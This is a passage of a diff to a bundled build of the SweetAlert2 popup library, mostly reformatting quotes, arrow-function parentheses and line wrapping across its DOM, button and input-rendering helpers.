@@ -1,12 +1,12 @@
-import './chunk-3OV72XIM.js';
+import "./chunk-CX3I3NQG.js";
 
 // node_modules/sweetalert2/dist/sweetalert2.esm.all.js
 function _assertClassBrand(e, t, n) {
-  if ('function' == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n;
-  throw new TypeError('Private element is not present on this object');
+  if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n;
+  throw new TypeError("Private element is not present on this object");
 }
 function _checkPrivateRedeclaration(e, t) {
-  if (t.has(e)) throw new TypeError('Cannot initialize the same private elements twice on an object');
+  if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object");
 }
 function _classPrivateFieldGet2(s, a) {
   return s.get(_assertClassBrand(s, a));
@@ -27,8 +27,8 @@ var focusPreviousActiveElement = () => {
     document.body.focus();
   }
 };
-var restoreActiveElement = returnFocus => {
-  return new Promise(resolve => {
+var restoreActiveElement = (returnFocus) => {
+  return new Promise((resolve) => {
     if (!returnFocus) {
       return resolve();
     }
@@ -41,80 +41,8 @@ var restoreActiveElement = returnFocus => {
     window.scrollTo(x, y);
   });
 };
-var swalPrefix = 'swal2-';
-var classNames = [
-  'container',
-  'shown',
-  'height-auto',
-  'iosfix',
-  'popup',
-  'modal',
-  'no-backdrop',
-  'no-transition',
-  'toast',
-  'toast-shown',
-  'show',
-  'hide',
-  'close',
-  'title',
-  'html-container',
-  'actions',
-  'confirm',
-  'deny',
-  'cancel',
-  'default-outline',
-  'footer',
-  'icon',
-  'icon-content',
-  'image',
-  'input',
-  'file',
-  'range',
-  'select',
-  'radio',
-  'checkbox',
-  'label',
-  'textarea',
-  'inputerror',
-  'input-label',
-  'validation-message',
-  'progress-steps',
-  'active-progress-step',
-  'progress-step',
-  'progress-step-line',
-  'loader',
-  'loading',
-  'styled',
-  'top',
-  'top-start',
-  'top-end',
-  'top-left',
-  'top-right',
-  'center',
-  'center-start',
-  'center-end',
-  'center-left',
-  'center-right',
-  'bottom',
-  'bottom-start',
-  'bottom-end',
-  'bottom-left',
-  'bottom-right',
-  'grow-row',
-  'grow-column',
-  'grow-fullscreen',
-  'rtl',
-  'timer-progress-bar',
-  'timer-progress-bar-container',
-  'scrollbar-measure',
-  'icon-success',
-  'icon-warning',
-  'icon-info',
-  'icon-question',
-  'icon-error',
-  'draggable',
-  'dragging',
-];
+var swalPrefix = "swal2-";
+var classNames = ["container", "shown", "height-auto", "iosfix", "popup", "modal", "no-backdrop", "no-transition", "toast", "toast-shown", "show", "hide", "close", "title", "html-container", "actions", "confirm", "deny", "cancel", "default-outline", "footer", "icon", "icon-content", "image", "input", "file", "range", "select", "radio", "checkbox", "label", "textarea", "inputerror", "input-label", "validation-message", "progress-steps", "active-progress-step", "progress-step", "progress-step-line", "loader", "loading", "styled", "top", "top-start", "top-end", "top-left", "top-right", "center", "center-start", "center-end", "center-left", "center-right", "bottom", "bottom-start", "bottom-end", "bottom-left", "bottom-right", "grow-row", "grow-column", "grow-fullscreen", "rtl", "timer-progress-bar", "timer-progress-bar-container", "scrollbar-measure", "icon-success", "icon-warning", "icon-info", "icon-question", "icon-error", "draggable", "dragging"];
 var swalClasses = classNames.reduce(
   (acc, className) => {
     acc[className] = swalPrefix + className;
@@ -123,7 +51,7 @@ var swalClasses = classNames.reduce(
   /** @type {SwalClasses} */
   {}
 );
-var icons = ['success', 'warning', 'info', 'question', 'error'];
+var icons = ["success", "warning", "info", "question", "error"];
 var iconTypes = icons.reduce(
   (acc, icon) => {
     acc[icon] = swalPrefix + icon;
@@ -132,59 +60,62 @@ var iconTypes = icons.reduce(
   /** @type {SwalIcons} */
   {}
 );
-var consolePrefix = 'SweetAlert2:';
-var capitalizeFirstLetter = str => str.charAt(0).toUpperCase() + str.slice(1);
-var warn = message => {
-  console.warn(`${consolePrefix} ${typeof message === 'object' ? message.join(' ') : message}`);
+var consolePrefix = "SweetAlert2:";
+var capitalizeFirstLetter = (str) => str.charAt(0).toUpperCase() + str.slice(1);
+var warn = (message) => {
+  console.warn(`${consolePrefix} ${typeof message === "object" ? message.join(" ") : message}`);
 };
-var error = message => {
+var error = (message) => {
   console.error(`${consolePrefix} ${message}`);
 };
 var previousWarnOnceMessages = [];
-var warnOnce = message => {
+var warnOnce = (message) => {
   if (!previousWarnOnceMessages.includes(message)) {
     previousWarnOnceMessages.push(message);
     warn(message);
   }
 };
-var warnAboutDeprecation = function (deprecatedParam) {
+var warnAboutDeprecation = function(deprecatedParam) {
   let useInstead = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : null;
-  warnOnce(`"${deprecatedParam}" is deprecated and will be removed in the next major release.${useInstead ? ` Use "${useInstead}" instead.` : ''}`);
+  warnOnce(`"${deprecatedParam}" is deprecated and will be removed in the next major release.${useInstead ? ` Use "${useInstead}" instead.` : ""}`);
 };
-var callIfFunction = arg => (typeof arg === 'function' ? arg() : arg);
-var hasToPromiseFn = arg => arg && typeof arg.toPromise === 'function';
-var asPromise = arg => (hasToPromiseFn(arg) ? arg.toPromise() : Promise.resolve(arg));
-var isPromise = arg => arg && Promise.resolve(arg) === arg;
+var callIfFunction = (arg) => typeof arg === "function" ? arg() : arg;
+var hasToPromiseFn = (arg) => arg && typeof arg.toPromise === "function";
+var asPromise = (arg) => hasToPromiseFn(arg) ? arg.toPromise() : Promise.resolve(arg);
+var isPromise = (arg) => arg && Promise.resolve(arg) === arg;
 var getContainer = () => document.body.querySelector(`.${swalClasses.container}`);
-var elementBySelector = selectorString => {
+var elementBySelector = (selectorString) => {
   const container = getContainer();
   return container ? container.querySelector(selectorString) : null;
 };
-var elementByClass = className => {
+var elementByClass = (className) => {
   return elementBySelector(`.${className}`);
 };
 var getPopup = () => elementByClass(swalClasses.popup);
 var getIcon = () => elementByClass(swalClasses.icon);
-var getIconContent = () => elementByClass(swalClasses['icon-content']);
+var getIconContent = () => elementByClass(swalClasses["icon-content"]);
 var getTitle = () => elementByClass(swalClasses.title);
-var getHtmlContainer = () => elementByClass(swalClasses['html-container']);
+var getHtmlContainer = () => elementByClass(swalClasses["html-container"]);
 var getImage = () => elementByClass(swalClasses.image);
-var getProgressSteps = () => elementByClass(swalClasses['progress-steps']);
-var getValidationMessage = () => elementByClass(swalClasses['validation-message']);
-var getConfirmButton = () =>
+var getProgressSteps = () => elementByClass(swalClasses["progress-steps"]);
+var getValidationMessage = () => elementByClass(swalClasses["validation-message"]);
+var getConfirmButton = () => (
   /** @type {HTMLButtonElement} */
-  elementBySelector(`.${swalClasses.actions} .${swalClasses.confirm}`);
-var getCancelButton = () =>
+  elementBySelector(`.${swalClasses.actions} .${swalClasses.confirm}`)
+);
+var getCancelButton = () => (
   /** @type {HTMLButtonElement} */
-  elementBySelector(`.${swalClasses.actions} .${swalClasses.cancel}`);
-var getDenyButton = () =>
+  elementBySelector(`.${swalClasses.actions} .${swalClasses.cancel}`)
+);
+var getDenyButton = () => (
   /** @type {HTMLButtonElement} */
-  elementBySelector(`.${swalClasses.actions} .${swalClasses.deny}`);
-var getInputLabel = () => elementByClass(swalClasses['input-label']);
+  elementBySelector(`.${swalClasses.actions} .${swalClasses.deny}`)
+);
+var getInputLabel = () => elementByClass(swalClasses["input-label"]);
 var getLoader = () => elementBySelector(`.${swalClasses.loader}`);
 var getActions = () => elementByClass(swalClasses.actions);
 var getFooter = () => elementByClass(swalClasses.footer);
-var getTimerProgressBar = () => elementByClass(swalClasses['timer-progress-bar']);
+var getTimerProgressBar = () => elementByClass(swalClasses["timer-progress-bar"]);
 var getCloseButton = () => elementByClass(swalClasses.close);
 var focusable = `
   a[href],
@@ -209,8 +140,8 @@ var getFocusableElements = () => {
   }
   const focusableElementsWithTabindex = popup.querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])');
   const focusableElementsWithTabindexSorted = Array.from(focusableElementsWithTabindex).sort((a, b) => {
-    const tabindexA = parseInt(a.getAttribute('tabindex') || '0');
-    const tabindexB = parseInt(b.getAttribute('tabindex') || '0');
+    const tabindexA = parseInt(a.getAttribute("tabindex") || "0");
+    const tabindexB = parseInt(b.getAttribute("tabindex") || "0");
     if (tabindexA > tabindexB) {
       return 1;
     } else if (tabindexA < tabindexB) {
@@ -219,15 +150,11 @@ var getFocusableElements = () => {
     return 0;
   });
   const otherFocusableElements = popup.querySelectorAll(focusable);
-  const otherFocusableElementsFiltered = Array.from(otherFocusableElements).filter(el => el.getAttribute('tabindex') !== '-1');
-  return [...new Set(focusableElementsWithTabindexSorted.concat(otherFocusableElementsFiltered))].filter(el => isVisible$1(el));
+  const otherFocusableElementsFiltered = Array.from(otherFocusableElements).filter((el) => el.getAttribute("tabindex") !== "-1");
+  return [...new Set(focusableElementsWithTabindexSorted.concat(otherFocusableElementsFiltered))].filter((el) => isVisible$1(el));
 };
 var isModal = () => {
-  return (
-    hasClass(document.body, swalClasses.shown) &&
-    !hasClass(document.body, swalClasses['toast-shown']) &&
-    !hasClass(document.body, swalClasses['no-backdrop'])
-  );
+  return hasClass(document.body, swalClasses.shown) && !hasClass(document.body, swalClasses["toast-shown"]) && !hasClass(document.body, swalClasses["no-backdrop"]);
 };
 var isToast = () => {
   const popup = getPopup();
@@ -241,22 +168,22 @@ var isLoading = () => {
   if (!popup) {
     return false;
   }
-  return popup.hasAttribute('data-loading');
+  return popup.hasAttribute("data-loading");
 };
 var setInnerHtml = (elem, html) => {
-  elem.textContent = '';
+  elem.textContent = "";
   if (html) {
     const parser = new DOMParser();
     const parsed = parser.parseFromString(html, `text/html`);
-    const head = parsed.querySelector('head');
+    const head = parsed.querySelector("head");
     if (head) {
-      Array.from(head.childNodes).forEach(child => {
+      Array.from(head.childNodes).forEach((child) => {
         elem.appendChild(child);
       });
     }
-    const body = parsed.querySelector('body');
+    const body = parsed.querySelector("body");
     if (body) {
-      Array.from(body.childNodes).forEach(child => {
+      Array.from(body.childNodes).forEach((child) => {
         if (child instanceof HTMLVideoElement || child instanceof HTMLAudioElement) {
           elem.appendChild(child.cloneNode(true));
         } else {
@@ -279,12 +206,8 @@ var hasClass = (elem, className) => {
   return true;
 };
 var removeCustomClasses = (elem, params) => {
-  Array.from(elem.classList).forEach(className => {
-    if (
-      !Object.values(swalClasses).includes(className) &&
-      !Object.values(iconTypes).includes(className) &&
-      !Object.values(params.showClass || {}).includes(className)
-    ) {
+  Array.from(elem.classList).forEach((className) => {
+    if (!Object.values(swalClasses).includes(className) && !Object.values(iconTypes).includes(className) && !Object.values(params.showClass || {}).includes(className)) {
       elem.classList.remove(className);
     }
   });
@@ -294,13 +217,14 @@ var applyCustomClass = (elem, params, className) => {
   if (!params.customClass) {
     return;
   }
-  const customClass =
+  const customClass = params.customClass[
     /** @type {keyof SweetAlertCustomClass} */
-    params.customClass[className];
+    className
+  ];
   if (!customClass) {
     return;
   }
-  if (typeof customClass !== 'string' && !customClass.forEach) {
+  if (typeof customClass !== "string" && !customClass.forEach) {
     warn(`Invalid type of customClass.${className}! Expected string or iterable object, got "${typeof customClass}"`);
     return;
   }
@@ -311,28 +235,25 @@ var getInput$1 = (popup, inputClass) => {
     return null;
   }
   switch (inputClass) {
-    case 'select':
-    case 'textarea':
-    case 'file':
+    case "select":
+    case "textarea":
+    case "file":
       return popup.querySelector(`.${swalClasses.popup} > .${swalClasses[inputClass]}`);
-    case 'checkbox':
+    case "checkbox":
       return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.checkbox} input`);
-    case 'radio':
-      return (
-        popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:checked`) ||
-        popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:first-child`)
-      );
-    case 'range':
+    case "radio":
+      return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:checked`) || popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:first-child`);
+    case "range":
       return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.range} input`);
     default:
       return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.input}`);
   }
 };
-var focusInput = input => {
+var focusInput = (input) => {
   input.focus();
-  if (input.type !== 'file') {
+  if (input.type !== "file") {
     const val = input.value;
-    input.value = '';
+    input.value = "";
     input.value = val;
   }
 };
@@ -340,12 +261,12 @@ var toggleClass = (target, classList, condition) => {
   if (!target || !classList) {
     return;
   }
-  if (typeof classList === 'string') {
+  if (typeof classList === "string") {
     classList = classList.split(/\s+/).filter(Boolean);
   }
-  classList.forEach(className => {
+  classList.forEach((className) => {
     if (Array.isArray(target)) {
-      target.forEach(elem => {
+      target.forEach((elem) => {
         if (condition) {
           elem.classList.add(className);
         } else {
@@ -381,26 +302,26 @@ var applyNumericalStyle = (elem, property, value) => {
     value = parseInt(value);
   }
   if (value || parseInt(value) === 0) {
-    elem.style.setProperty(property, typeof value === 'number' ? `${value}px` : value);
+    elem.style.setProperty(property, typeof value === "number" ? `${value}px` : value);
   } else {
     elem.style.removeProperty(property);
   }
 };
-var show = function (elem) {
-  let display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : 'flex';
+var show = function(elem) {
+  let display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "flex";
   if (!elem) {
     return;
   }
   elem.style.display = display;
 };
-var hide = elem => {
+var hide = (elem) => {
   if (!elem) {
     return;
   }
-  elem.style.display = 'none';
+  elem.style.display = "none";
 };
-var showWhenInnerHtmlPresent = function (elem) {
-  let display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : 'block';
+var showWhenInnerHtmlPresent = function(elem) {
+  let display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "block";
   if (!elem) {
     return;
   }
@@ -408,7 +329,7 @@ var showWhenInnerHtmlPresent = function (elem) {
     toggle(elem, elem.innerHTML, display);
   }).observe(elem, {
     childList: true,
-    subtree: true,
+    subtree: true
   });
 };
 var setStyle = (parent, selector, property, value) => {
@@ -417,24 +338,24 @@ var setStyle = (parent, selector, property, value) => {
     el.style.setProperty(property, value);
   }
 };
-var toggle = function (elem, condition) {
-  let display = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : 'flex';
+var toggle = function(elem, condition) {
+  let display = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : "flex";
   if (condition) {
     show(elem, display);
   } else {
     hide(elem);
   }
 };
-var isVisible$1 = elem => !!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
+var isVisible$1 = (elem) => !!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
 var allButtonsAreHidden = () => !isVisible$1(getConfirmButton()) && !isVisible$1(getDenyButton()) && !isVisible$1(getCancelButton());
-var isScrollable = elem => !!(elem.scrollHeight > elem.clientHeight);
-var hasCssAnimation = elem => {
+var isScrollable = (elem) => !!(elem.scrollHeight > elem.clientHeight);
+var hasCssAnimation = (elem) => {
   const style = window.getComputedStyle(elem);
-  const animDuration = parseFloat(style.getPropertyValue('animation-duration') || '0');
-  const transDuration = parseFloat(style.getPropertyValue('transition-duration') || '0');
+  const animDuration = parseFloat(style.getPropertyValue("animation-duration") || "0");
+  const transDuration = parseFloat(style.getPropertyValue("transition-duration") || "0");
   return animDuration > 0 || transDuration > 0;
 };
-var animateTimerProgressBar = function (timer) {
+var animateTimerProgressBar = function(timer) {
   let reset = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : false;
   const timerProgressBar = getTimerProgressBar();
   if (!timerProgressBar) {
@@ -442,12 +363,12 @@ var animateTimerProgressBar = function (timer) {
   }
   if (isVisible$1(timerProgressBar)) {
     if (reset) {
-      timerProgressBar.style.transition = 'none';
-      timerProgressBar.style.width = '100%';
+      timerProgressBar.style.transition = "none";
+      timerProgressBar.style.width = "100%";
     }
     setTimeout(() => {
       timerProgressBar.style.transition = `width ${timer / 1e3}s linear`;
-      timerProgressBar.style.width = '0%';
+      timerProgressBar.style.width = "0%";
     }, 10);
   }
 };
@@ -457,21 +378,21 @@ var stopTimerProgressBar = () => {
     return;
   }
   const timerProgressBarWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
-  timerProgressBar.style.removeProperty('transition');
-  timerProgressBar.style.width = '100%';
+  timerProgressBar.style.removeProperty("transition");
+  timerProgressBar.style.width = "100%";
   const timerProgressBarFullWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
-  const timerProgressBarPercent = (timerProgressBarWidth / timerProgressBarFullWidth) * 100;
+  const timerProgressBarPercent = timerProgressBarWidth / timerProgressBarFullWidth * 100;
   timerProgressBar.style.width = `${timerProgressBarPercent}%`;
 };
-var isNodeEnv = () => typeof window === 'undefined' || typeof document === 'undefined';
+var isNodeEnv = () => typeof window === "undefined" || typeof document === "undefined";
 var sweetHTML = `
- <div aria-labelledby="${swalClasses.title}" aria-describedby="${swalClasses['html-container']}" class="${swalClasses.popup}" tabindex="-1">
+ <div aria-labelledby="${swalClasses.title}" aria-describedby="${swalClasses["html-container"]}" class="${swalClasses.popup}" tabindex="-1">
    <button type="button" class="${swalClasses.close}"></button>
-   <ul class="${swalClasses['progress-steps']}"></ul>
+   <ul class="${swalClasses["progress-steps"]}"></ul>
    <div class="${swalClasses.icon}"></div>
    <img class="${swalClasses.image}" />
    <h2 class="${swalClasses.title}" id="${swalClasses.title}"></h2>
-   <div class="${swalClasses['html-container']}" id="${swalClasses['html-container']}"></div>
+   <div class="${swalClasses["html-container"]}" id="${swalClasses["html-container"]}"></div>
    <input class="${swalClasses.input}" id="${swalClasses.input}" />
    <input type="file" class="${swalClasses.file}" />
    <div class="${swalClasses.range}">
@@ -485,7 +406,7 @@ var sweetHTML = `
      <span class="${swalClasses.label}"></span>
    </label>
    <textarea class="${swalClasses.textarea}" id="${swalClasses.textarea}"></textarea>
-   <div class="${swalClasses['validation-message']}" id="${swalClasses['validation-message']}"></div>
+   <div class="${swalClasses["validation-message"]}" id="${swalClasses["validation-message"]}"></div>
    <div class="${swalClasses.actions}">
      <div class="${swalClasses.loader}"></div>
      <button type="button" class="${swalClasses.confirm}"></button>
@@ -493,18 +414,18 @@ var sweetHTML = `
      <button type="button" class="${swalClasses.cancel}"></button>
    </div>
    <div class="${swalClasses.footer}"></div>
-   <div class="${swalClasses['timer-progress-bar-container']}">
-     <div class="${swalClasses['timer-progress-bar']}"></div>
+   <div class="${swalClasses["timer-progress-bar-container"]}">
+     <div class="${swalClasses["timer-progress-bar"]}"></div>
    </div>
  </div>
-`.replace(/(^|\n)\s*/g, '');
+`.replace(/(^|\n)\s*/g, "");
 var resetOldContainer = () => {
   const oldContainer = getContainer();
   if (!oldContainer) {
     return false;
   }
   oldContainer.remove();
-  removeClass([document.documentElement, document.body], [swalClasses['no-backdrop'], swalClasses['toast-shown'], swalClasses['has-column']]);
+  removeClass([document.documentElement, document.body], [swalClasses["no-backdrop"], swalClasses["toast-shown"], swalClasses["has-column"]]);
   return true;
 };
 var resetValidationMessage$1 = () => {
@@ -533,30 +454,30 @@ var addInputChangeListeners = () => {
     rangeOutput.value = range.value;
   };
 };
-var getTarget = target => (typeof target === 'string' ? document.querySelector(target) : target);
-var setupAccessibility = params => {
+var getTarget = (target) => typeof target === "string" ? document.querySelector(target) : target;
+var setupAccessibility = (params) => {
   const popup = getPopup();
-  popup.setAttribute('role', params.toast ? 'alert' : 'dialog');
-  popup.setAttribute('aria-live', params.toast ? 'polite' : 'assertive');
+  popup.setAttribute("role", params.toast ? "alert" : "dialog");
+  popup.setAttribute("aria-live", params.toast ? "polite" : "assertive");
   if (!params.toast) {
-    popup.setAttribute('aria-modal', 'true');
+    popup.setAttribute("aria-modal", "true");
   }
 };
-var setupRTL = targetElement => {
-  if (window.getComputedStyle(targetElement).direction === 'rtl') {
+var setupRTL = (targetElement) => {
+  if (window.getComputedStyle(targetElement).direction === "rtl") {
     addClass(getContainer(), swalClasses.rtl);
   }
 };
-var init = params => {
+var init = (params) => {
   const oldContainerExisted = resetOldContainer();
   if (isNodeEnv()) {
-    error('SweetAlert2 requires document to initialize');
+    error("SweetAlert2 requires document to initialize");
     return;
   }
-  const container = document.createElement('div');
+  const container = document.createElement("div");
   container.className = swalClasses.container;
   if (oldContainerExisted) {
-    addClass(container, swalClasses['no-transition']);
+    addClass(container, swalClasses["no-transition"]);
   }
   setInnerHtml(container, sweetHTML);
   const targetElement = getTarget(params.target);
@@ -568,7 +489,7 @@ var init = params => {
 var parseHtmlToContainer = (param, target) => {
   if (param instanceof HTMLElement) {
     target.appendChild(param);
-  } else if (typeof param === 'object') {
+  } else if (typeof param === "object") {
     handleObject(param, target);
   } else if (param) {
     setInnerHtml(target, param);
@@ -582,7 +503,7 @@ var handleObject = (param, target) => {
   }
 };
 var handleJqueryElem = (target, elem) => {
-  target.textContent = '';
+  target.textContent = "";
   if (0 in elem) {
     for (let i = 0; i in elem; i++) {
       target.appendChild(elem[i].cloneNode(true));
@@ -602,10 +523,10 @@ var renderActions = (instance, params) => {
   } else {
     show(actions);
   }
-  applyCustomClass(actions, params, 'actions');
+  applyCustomClass(actions, params, "actions");
   renderButtons(actions, loader, params);
-  setInnerHtml(loader, params.loaderHtml || '');
-  applyCustomClass(loader, params, 'loader');
+  setInnerHtml(loader, params.loaderHtml || "");
+  applyCustomClass(loader, params, "loader");
 };
 function renderButtons(actions, loader, params) {
   const confirmButton = getConfirmButton();
@@ -614,9 +535,9 @@ function renderButtons(actions, loader, params) {
   if (!confirmButton || !denyButton || !cancelButton) {
     return;
   }
-  renderButton(confirmButton, 'confirm', params);
-  renderButton(denyButton, 'deny', params);
-  renderButton(cancelButton, 'cancel', params);
+  renderButton(confirmButton, "confirm", params);
+  renderButton(denyButton, "deny", params);
+  renderButton(cancelButton, "cancel", params);
   handleButtonsStyling(confirmButton, denyButton, cancelButton, params);
   if (params.reverseButtons) {
     if (params.toast) {
@@ -637,24 +558,25 @@ function handleButtonsStyling(confirmButton, denyButton, cancelButton, params) {
   addClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
   if (params.confirmButtonColor) {
     confirmButton.style.backgroundColor = params.confirmButtonColor;
-    addClass(confirmButton, swalClasses['default-outline']);
+    addClass(confirmButton, swalClasses["default-outline"]);
   }
   if (params.denyButtonColor) {
     denyButton.style.backgroundColor = params.denyButtonColor;
-    addClass(denyButton, swalClasses['default-outline']);
+    addClass(denyButton, swalClasses["default-outline"]);
   }
   if (params.cancelButtonColor) {
     cancelButton.style.backgroundColor = params.cancelButtonColor;
-    addClass(cancelButton, swalClasses['default-outline']);
+    addClass(cancelButton, swalClasses["default-outline"]);
   }
 }
 function renderButton(button, buttonType, params) {
-  const buttonName =
+  const buttonName = (
     /** @type {'Confirm' | 'Deny' | 'Cancel'} */
-    capitalizeFirstLetter(buttonType);
-  toggle(button, params[`show${buttonName}Button`], 'inline-block');
-  setInnerHtml(button, params[`${buttonType}ButtonText`] || '');
-  button.setAttribute('aria-label', params[`${buttonType}ButtonAriaLabel`] || '');
+    capitalizeFirstLetter(buttonType)
+  );
+  toggle(button, params[`show${buttonName}Button`], "inline-block");
+  setInnerHtml(button, params[`${buttonType}ButtonText`] || "");
+  button.setAttribute("aria-label", params[`${buttonType}ButtonAriaLabel`] || "");
   button.className = swalClasses[buttonType];
   applyCustomClass(button, params, `${buttonType}Button`);
 }
@@ -663,10 +585,10 @@ var renderCloseButton = (instance, params) => {
   if (!closeButton) {
     return;
   }
-  setInnerHtml(closeButton, params.closeButtonHtml || '');
-  applyCustomClass(closeButton, params, 'closeButton');
+  setInnerHtml(closeButton, params.closeButtonHtml || "");
+  applyCustomClass(closeButton, params, "closeButton");
   toggle(closeButton, params.showCloseButton);
-  closeButton.setAttribute('aria-label', params.closeButtonAriaLabel || '');
+  closeButton.setAttribute("aria-label", params.closeButtonAriaLabel || "");
 };
 var renderContainer = (instance, params) => {
   const container = getContainer();
@@ -676,13 +598,13 @@ var renderContainer = (instance, params) => {
   handleBackdropParam(container, params.backdrop);
   handlePositionParam(container, params.position);
   handleGrowParam(container, params.grow);
-  applyCustomClass(container, params, 'container');
+  applyCustomClass(container, params, "container");
 };
 function handleBackdropParam(container, backdrop) {
-  if (typeof backdrop === 'string') {
+  if (typeof backdrop === "string") {
     container.style.background = backdrop;
   } else if (!backdrop) {
-    addClass([document.documentElement, document.body], swalClasses['no-backdrop']);
+    addClass([document.documentElement, document.body], swalClasses["no-backdrop"]);
   }
 }
 function handlePositionParam(container, position) {
@@ -704,9 +626,9 @@ function handleGrowParam(container, grow) {
 }
 var privateProps = {
   innerParams: /* @__PURE__ */ new WeakMap(),
-  domCache: /* @__PURE__ */ new WeakMap(),
+  domCache: /* @__PURE__ */ new WeakMap()
 };
-var inputClasses = ['input', 'file', 'range', 'select', 'radio', 'checkbox', 'textarea'];
+var inputClasses = ["input", "file", "range", "select", "radio", "checkbox", "textarea"];
 var renderInput = (instance, params) => {
   const popup = getPopup();
   if (!popup) {
@@ -714,7 +636,7 @@ var renderInput = (instance, params) => {
   }
   const innerParams = privateProps.innerParams.get(instance);
   const rerender = !innerParams || params.input !== innerParams.input;
-  inputClasses.forEach(inputClass => {
+  inputClasses.forEach((inputClass) => {
     const inputContainer = getDirectChildByClass(popup, swalClasses[inputClass]);
     if (!inputContainer) {
       return;
@@ -732,12 +654,12 @@ var renderInput = (instance, params) => {
     setCustomClass(params);
   }
 };
-var showInput = params => {
+var showInput = (params) => {
   if (!params.input) {
     return;
   }
   if (!renderInputType[params.input]) {
-    error(`Unexpected type of input! Expected ${Object.keys(renderInputType).join(' | ')}, got "${params.input}"`);
+    error(`Unexpected type of input! Expected ${Object.keys(renderInputType).join(" | ")}, got "${params.input}"`);
     return;
   }
   const inputContainer = getInputContainer(params.input);
@@ -752,10 +674,10 @@ var showInput = params => {
     });
   }
 };
-var removeAttributes = input => {
+var removeAttributes = (input) => {
   for (let i = 0; i < input.attributes.length; i++) {
     const attrName = input.attributes[i].name;
-    if (!['id', 'type', 'value', 'style'].includes(attrName)) {
+    if (!["id", "type", "value", "style"].includes(attrName)) {
       input.removeAttribute(attrName);
     }
   }
@@ -774,13 +696,13 @@ var setAttributes = (inputClass, inputAttributes) => {
     input.setAttribute(attr, inputAttributes[attr]);
   }
 };
-var setCustomClass = params => {
+var setCustomClass = (params) => {
   if (!params.input) {
     return;
   }
   const inputContainer = getInputContainer(params.input);
   if (inputContainer) {
-    applyCustomClass(inputContainer, params, 'input');
+    applyCustomClass(inputContainer, params, "input");
   }
 };
 var setInputPlaceholder = (input, params) => {
@@ -790,64 +712,51 @@ var setInputPlaceholder = (input, params) => {
 };
 var setInputLabel = (input, prependTo, params) => {
   if (params.inputLabel) {
-    const label = document.createElement('label');
-    const labelClass = swalClasses['input-label'];
-    label.setAttribute('for', input.id);
+    const label = document.createElement("label");
+    const labelClass = swalClasses["input-label"];
+    label.setAttribute("for", input.id);
     label.className = labelClass;
-    if (typeof params.customClass === 'object') {
+    if (typeof params.customClass === "object") {
       addClass(label, params.customClass.inputLabel);
     }
     label.innerText = params.inputLabel;
-    prependTo.insertAdjacentElement('beforebegin', label);
+    prependTo.insertAdjacentElement("beforebegin", label);
   }
 };
-var getInputContainer = inputType => {
+var getInputContainer = (inputType) => {
   const popup = getPopup();
   if (!popup) {
     return;
   }
-  return getDirectChildByClass(
-    popup,
+  return getDirectChildByClass(popup, swalClasses[
     /** @type {SwalClass} */
-    swalClasses[inputType] || swalClasses.input
-  );
+    inputType
+  ] || swalClasses.input);
 };
 var checkAndSetInputValue = (input, inputValue) => {
-  if (['string', 'number'].includes(typeof inputValue)) {
+  if (["string", "number"].includes(typeof inputValue)) {
     input.value = `${inputValue}`;
   } else if (!isPromise(inputValue)) {
     warn(`Unexpected type of inputValue! Expected "string", "number" or "Promise", got "${typeof inputValue}"`);
   }
 };
 var renderInputType = {};
-renderInputType.text =
-  renderInputType.email =
-  renderInputType.password =
-  renderInputType.number =
-  renderInputType.tel =
-  renderInputType.url =
-  renderInputType.search =
-  renderInputType.date =
-  renderInputType['datetime-local'] =
-  renderInputType.time =
-  renderInputType.week =
-  renderInputType.month =
-    /** @type {(input: Input | HTMLElement, params: SweetAlertOptions) => Input} */
-    (input, params) => {
-      checkAndSetInputValue(input, params.inputValue);
-      setInputLabel(input, input, params);
-      setInputPlaceholder(input, params);
-      input.type = params.input;
-      return input;
-    };
+renderInputType.text = renderInputType.email = renderInputType.password = renderInputType.number = renderInputType.tel = renderInputType.url = renderInputType.search = renderInputType.date = renderInputType["datetime-local"] = renderInputType.time = renderInputType.week = renderInputType.month = /** @type {(input: Input | HTMLElement, params: SweetAlertOptions) => Input} */
+(input, params) => {
+  checkAndSetInputValue(input, params.inputValue);
+  setInputLabel(input, input, params);
+  setInputPlaceholder(input, params);
+  input.type = params.input;
+  return input;
+};
 renderInputType.file = (input, params) => {
   setInputLabel(input, input, params);
   setInputPlaceholder(input, params);
   return input;
 };
 renderInputType.range = (range, params) => {
-  const rangeInput = range.querySelector('input');
-  const rangeOutput = range.querySelector('output');
+  const rangeInput = range.querySelector("input");
+  const rangeOutput = range.querySelector("output");
   checkAndSetInputValue(rangeInput, params.inputValue);
   rangeInput.type = params.input;
   checkAndSetInputValue(rangeOutput, params.inputValue);
@@ -855,11 +764,11 @@ renderInputType.range = (range, params) => {
   return range;
 };
 renderInputType.select = (select, params) => {
-  select.textContent = '';
+  select.textContent = "";
   if (params.inputPlaceholder) {
-    const placeholder = document.createElement('option');
+    const placeholder = document.createElement("option");
     setInnerHtml(placeholder, params.inputPlaceholder);
-    placeholder.value = '';
+    placeholder.value = "";
     placeholder.disabled = true;
     placeholder.selected = true;
     select.appendChild(placeholder);
@@ -867,15 +776,15 @@ renderInputType.select = (select, params) => {
   setInputLabel(select, select, params);
   return select;
 };
-renderInputType.radio = radio => {
-  radio.textContent = '';
+renderInputType.radio = (radio) => {
